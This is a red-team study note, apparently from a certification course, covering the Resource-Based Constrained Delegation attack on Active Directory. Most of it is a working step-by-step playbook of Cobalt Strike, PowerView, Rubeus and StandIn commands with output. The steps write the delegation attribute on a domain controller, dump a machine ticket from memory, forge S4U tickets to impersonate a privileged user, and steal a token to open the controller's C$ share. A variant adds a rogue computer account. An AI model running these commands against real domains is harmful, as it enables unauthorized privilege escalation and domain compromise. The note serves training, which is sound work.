
Allows the delegation configuration to be set on the target rather than the source. 

### 🖊️ How it works

With [[Constrained Delegation]], where for example a DC allows to delegate a certain computer to impersonate any user to any service in the DC, RBCD instead only requires that the user has certain property (can be WriteProperty, GenericAll, GenericWrite, GenericDacl) on the computer object to be able to reach it. 

### 📔 Requisites to attack

1. A target computer on which you can modify ==msDS-AllowedToActOnBehalfOfOtherIdentity.
2. Control of another principal that has an [[Service Principal Name (SPN)]].



###  📗 attack via Cobalt Strike 

1) Check every domain computer's ACL (looking for the rights we want)

```
beacon> powershell Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }

AceQualifier           : AccessAllowed
ObjectDN               : CN=DC-2,OU=Domain Controllers,DC=dev,DC=cyberbotic,DC=io
ActiveDirectoryRights  : Self, WriteProperty
ObjectAceType          : All
ObjectSID              : S-1-5-21-569305411-121244042-2357301523-1000
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-569305411-121244042-2357301523-1107
AccessMask             : 40
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : Computer
OpaqueLength           : 0
```

The results can be bigger, in this example we find something interesting, a group (still don't know which), has writeproperty rights on all properties (ObjectAceType) for "DC-2" machine (check the common name CN=DC-2)

2) Figure out the group via security identifier

`beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107`

3) We now need obtaining a principal with an SPN, so we can use a computer account. Locate a machine where you have SYSTEM rights (if you dont check RBCD with no SYSTEM, lower section). To start the attack, we need its SID.

In this example we have system on `wkstn-2`

```
beacon> powershell Get-DomainComputer -Identity wkstn-2 -Properties objectSid

objectsid                                   
---------                                   
S-1-5-21-569305411-121244042-2357301523-1109
```

4) We'll then use this SID inside an SDDL to create a security descriptor.  The content of ==msDS-AllowedToActOnBehalfOfOtherIdentity== must be in raw binary format. Write this in a notepad:
```
$rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)"
$rsdb = New-Object byte[] ($rsd.BinaryLength)
$rsd.GetBinaryForm($rsdb, 0)
```


5) These descriptor bytes can then be used with `Set-DomainObject`.  However, since we're working through Cobalt Strike, everything has to be concatenated into a single PowerShell command.
```
beacon> powershell $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer -Identity "dc-2" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose

Setting 'msDS-AllowedToActOnBehalfOfOtherIdentity' to '1 0 4 128 20 0 0 0 0 0 0 0 0 0 0 0 36 0 0 0 1 2 0 0 0 0 0 5 32 0 0 0 32 2 0 0 2 0 44 0 1 0 0 0 0 0 36 0 255 1 15 0 1 5 0 0 0 0 0 5 21 0 0 0 67 233 238 33 138 9 58 7 19 145 129 140 85 4 0 0' for object 'DC-2$'

beacon> powershell Get-DomainComputer -Identity "dc-2" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

6) Next, we use the WKSN-2$ account to perform the S4U impersonation with Rubeus.  The `s4u` command requires a TGT, RC4 or AES hash.  Since we already have elevated access to it, we can just extract its TGT from memory.

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
```

7) Now you execute [[S4U2Self Abuse]]

`beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:WKSTN-2$ /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /ticket:doIFuD[...]5JTw== /nowrap`

8) Finally, pass the ticket into a logon session for use.

`beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGcD[...]MuaW8=`

`beacon> steal_token 4092`

9) Check your access

`beacon> ls \\dc-2.dev.cyberbotic.io\c$`

To clear:
`beacon> powershell Get-DomainComputer -Identity dc-2 | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity`


---
##### RBCD with no SYSTEM

If you did not have local admin access to a computer already, you can resort to creating your own computer object.  By default, even domain users can join up to 10 computers to a domain

1) [StandIn](https://github.com/FuzzySecurity/StandIn) is a post-ex toolkit written by [Ruben Boonen](https://twitter.com/FuzzySec) and has the functionality to create a computer with a random password.
```
beacon> execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe --computer EvilComputer --make

[?] Using DC    : dc-2.dev.cyberbotic.io
    |_ Domain   : dev.cyberbotic.io
    |_ DN       : CN=EvilComputer,CN=Computers,DC=dev,DC=cyberbotic,DC=io
    |_ Password : oIrpupAtF1YCXaw

[+] Machine account added to AD..
```

2) Rubeus `hash` can take that password and calculate their hashes.

```
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /password:oIrpupAtF1YCXaw /user:EvilComputer$ /domain:dev.cyberbotic.io
```

3) These can then be used with `asktgt` to obtain a TGT for the fake computer.
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:EvilComputer$ /aes256:7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044 /nowrap
```

4) The rest of the attack is the same


### ⚠ Opsec




### Properties
---
📆 created   {{19-02-2024}} 11:34
🏷️ tags: #redteam #crto 

---

